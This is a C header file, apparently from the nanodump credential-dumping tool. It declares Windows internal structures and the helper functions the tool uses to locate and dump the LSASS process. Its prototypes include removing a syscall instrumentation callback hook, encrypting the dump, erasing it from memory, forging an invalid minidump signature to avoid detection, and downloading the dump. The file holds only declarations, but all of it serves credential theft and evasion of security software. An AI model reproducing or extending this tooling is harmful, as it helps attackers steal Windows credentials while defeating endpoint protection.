#pragma once

#include "nanodump.h"
#include "ntdefs.h"
#include "output.h"

#define UNUSED(x) (void)(x)

#if defined(_MSC_VER)
 #define ProcessInstrumentationCallback 40
#endif

typedef struct _linked_list
{
    struct _linked_list* next;
} linked_list, *Plinked_list;

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
#define DATA_FREE(d, l) \
    if (d) { \
        memset(d, 0, l); \
        intFree(d); \
        d = NULL; \
    }

#define RVA(type, base_addr, rva) (type)(ULONG_PTR)((ULONG_PTR) base_addr + rva)

typedef DWORD(WINAPI* GetEnvironmentVariableW_t) (LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);

#define GetEnvironmentVariableW_SW2_HASH 0x2F9C600B

#ifdef _WIN64
 #define CID_OFFSET 0x40
 #define TEB_OFFSET 0x30
 #define PEB_OFFSET 0x60
 #define READ_MEMLOC __readgsqword
#else
 #define CID_OFFSET 0x20
 #define TEB_OFFSET 0x18
 #define PEB_OFFSET 0x30
 #define READ_MEMLOC __readfsdword
#endif

typedef enum  {
  PSS_CAPTURE_NONE = 0x00000000,
  PSS_CAPTURE_VA_CLONE = 0x00000001,
  PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
  PSS_CAPTURE_HANDLES = 0x00000004,
  PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
  PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
  PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
  PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
  PSS_CAPTURE_THREADS = 0x00000080,
  PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
  PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
  PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
  PSS_CAPTURE_VA_SPACE = 0x00000800,
  PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
  PSS_CAPTURE_IPT_TRACE = 0x00002000,
  PSS_CAPTURE_RESERVED_00004000,
  PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
  PSS_CREATE_BREAKAWAY = 0x08000000,
  PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
  PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
  PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
  PSS_CREATE_RELEASE_SECTION = 0x80000000
} PSS_CAPTURE_FLAGS;

typedef enum  {
  PSS_QUERY_PROCESS_INFORMATION = 0,
  PSS_QUERY_VA_CLONE_INFORMATION = 1,
  PSS_QUERY_AUXILIARY_PAGES_INFORMATION = 2,
  PSS_QUERY_VA_SPACE_INFORMATION = 3,
  PSS_QUERY_HANDLE_INFORMATION = 4,
  PSS_QUERY_THREAD_INFORMATION = 5,
  PSS_QUERY_HANDLE_TRACE_INFORMATION = 6,
  PSS_QUERY_PERFORMANCE_COUNTERS = 7
} PSS_QUERY_INFORMATION_CLASS;

struct _CURDIR
{
    struct _UNICODE_STRING DosPath;
    VOID* Handle;
};

typedef struct _PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    VOID* ConsoleHandle;
    ULONG ConsoleFlags;
    VOID* StandardInput;
    VOID* StandardOutput;
    VOID* StandardError;
    struct _CURDIR CurrentDirectory;
    struct _UNICODE_STRING DllPath;
    struct _UNICODE_STRING ImagePathName;
    struct _UNICODE_STRING CommandLine;
} PROCESS_PARAMETERS, *PPROCESS_PARAMETERS;

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

BOOL print_shtinkering_crash_location(VOID);

BOOL get_env_var(
    IN LPWSTR name,
    OUT LPWSTR value,
    IN DWORD size);

DWORD get_tick_count(VOID);

BOOL find_process_id_by_name(
    IN LPCSTR process_name,
    OUT PDWORD pPid);

BOOL is_full_path(
    IN LPCSTR filename);

VOID get_full_path(
    OUT PUNICODE_STRING full_dump_path,
    IN LPCSTR filename);

LPCWSTR get_cwd(VOID);

BOOL write_file(
    IN PUNICODE_STRING full_dump_path,
    IN PBYTE fileData,
    IN ULONG32 fileLength);

BOOL create_file(
    IN PUNICODE_STRING full_dump_path);

BOOL download_file(
    IN LPCSTR fileName,
    IN char fileData[],
    IN ULONG32 fileLength);

BOOL delete_file(
    IN LPCSTR filepath);

BOOL file_exists(
    IN LPCSTR filepath);

BOOL create_folder(
    IN LPCSTR folderpath);

BOOL wait_for_process(
    IN HANDLE hProcess);

BOOL get_process_image(
    IN HANDLE hProcess,
    OUT PUNICODE_STRING* process_image,
    OUT PULONG buffer_size);

BOOL is_lsass(
    IN HANDLE hProcess);

DWORD get_pid(
    IN HANDLE hProcess);

DWORD get_tid(
    IN HANDLE hThread);

BOOL kill_process(
    IN DWORD pid,
    IN HANDLE hProcess);

DWORD get_lsass_pid(VOID);

BOOL remove_syscall_callback_hook(VOID);

VOID print_success(
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL write_dump_to_disk);

VOID free_linked_list(
    IN PVOID head,
    IN ULONG node_size);

PVOID allocate_memory(
    OUT PSIZE_T region_size);

VOID encrypt_dump(
    IN PVOID base_address,
    IN SIZE_T region_size);

VOID erase_dump_from_memory(
    IN PVOID base_address,
    IN SIZE_T region_size);

VOID generate_invalid_sig(
    OUT PULONG32 Signature,
    OUT PUSHORT Version,
    OUT PUSHORT ImplementationVersion);

